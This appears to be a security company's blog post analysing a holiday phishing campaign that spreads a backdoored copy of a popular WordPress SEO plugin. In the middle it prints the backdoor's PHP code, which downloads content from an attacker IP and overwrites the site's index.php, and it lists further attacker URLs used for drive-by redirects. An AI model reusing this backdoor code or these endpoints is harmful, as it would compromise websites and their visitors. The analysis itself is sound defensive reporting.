@@ -1,0 +1,50 @@
+Phishing Emails to Install Malicious WordPress Plugins
+
+When all else fails, the bad guys can always rely on some basic social engineering tactics with a little hit of phishing!!
+Over the weekend, a few of our clients received a very suspicious email telling them to download a new version of the popular “All in One SEO Pack” plugin for WordPress. What a win, right? It wasn’t just the plugin, but the Pro version too. To top it off, it was for Free!!! This is where the journey begins…
+Happy Black Friday / Cyber Monday
+
+This is was the email:
+
+If you’re thinking something smells fishy, you’re probably right. Remember, if it sounds too good to be true, it probably is.
+Thanks to our lovely clients, we were able to dissect this attack to better understand what it was doing.
+At first glance, the email appears benign and it makes sense. It’s coming at the perfect time, Black Friday where us Americans can barely contain our need to be civil towards one another, and Cyber Monday, the day we have this overwhelming need to spend on things we don’t need. I mean, who would want to scam anyone during this time in which we are so jolly and willing to take anything we can for free, or heavily discounted?
+It turns out when you view the source of the email and check the download URL, it was not pointing to wordpress.org or even at plugins official site. It was redirecting to a random (likely compromised) Australian site:
+
+<A href="http://www.[infecteddomain].com.au/wp-content/all-in-one-seo-pack%20Pro%20v2.1.zip">All in One SEO Pack V2.1 Download Link</A>
+
+Call me crazy, but the download link from the plugin should not be www.[infecteddomain].com.au/wp-content/all-in-one-seo-pack.zip, or even http://[infecteddomain].com.br/js/wordpress/plugin.php. No, the domain should be attributed to the plugin authors, or on the WordPress Plugin Directory. This should have been a glaring red flag for most users.
+You’re probably thinking, “Ah come on guys, nobody would download a plugin direct from a random email they received.” Well, think again. We actually fixed sites in the past few days with this exact plugin installed. How bad was it? Well, let’s take a look…
+Analyzing the code
+If you did download the FREE Pro version from one of these emails you’ve likely been infected. Sorry. It turns out the core of the plugin was modified with a backdoor, giving the attackers full access to the server. You’ve been warned!
+We downloaded the plugin and analyzed the files, along with its backdoor. It looks exactly like the original “All in One SEO pack” plugin, except that they added a backdoor to the file aioseop_class.php. You can find the payload here: http://ddecode.com/phpdecoder/?results=1a5fe6d4a0543521597d36b0d691ba0e, but this, to us, was the most interesting part:
+
+$code_txt = 'http://91.239.15.61/o1.txt';
+$path = getenv("DOCUMENT_ROOT").'';
+
+if(is_dir($path.'/wp-content') AND is_dir($path.'/wp-admin') AND  is_dir($path.'/wp-includes')){
+$code= file_get_contents($code_txt);
+$index_path = $path.'/index.php';
+if(file_put_contents($index_path, $code)){
+}
+}else{
+echo 'Not a wordpress Installation';
+}
+
+It’s connecting to http://91.239.15.61/o1.txt and in the process it’s replacing your existing index.php with whatever content it has available. That’s just the beginning…
+Malware in action
+Once your index.php has been modified, the bad guys can start to display malicious content to anyone visiting the compromised site. It first starts with this encoded eval block (added to the index file):
+
+A little fancy decoding and it bears it all, it becomes this simple malware injection:
+
+See it?
+It’s connecting here http://91.239.15.61/java/google.php using the Curl function and it displays whatever the file contains. Right now it is displaying this encoded JavaScript injection which is detected by SiteCheck:
+
+From there it forces the users browser to download more content from http://91.239.15.61/google.js, and http://91.239.15.61/g.php, redirecting the user to SPAM (porn) sites, or to exploit kits where it will try to compromise the visitor further.
+[Sigh] All this for a drive by download attempt on the user. 🙁
+From a Simple Phishing Attack to an Infected Users Computer
+This is but a simple example of how using something as antiquated as phishing, coupled with user emotions around the idea of free gifts during the time of year reserved for giving can be exploited by an attacker.
+What’s the point you ask? Simple, free is not always good, and unless you have the skills to analyze things deeper, we recommend going directly to the source and confirming their giving spirit. You can often contact the source directly and confirm the emails or other offers you’re receiving.
+Remember, this is not reserved just to emails, this includes gifts you get via social mediums like Facebook, Twitter, Foursquare, etc…
+Again, you’ve been warned. But not to worry, if your website get’s compromised we’ll be here at normal prices to clean them up.
+Cheers.. 🙂
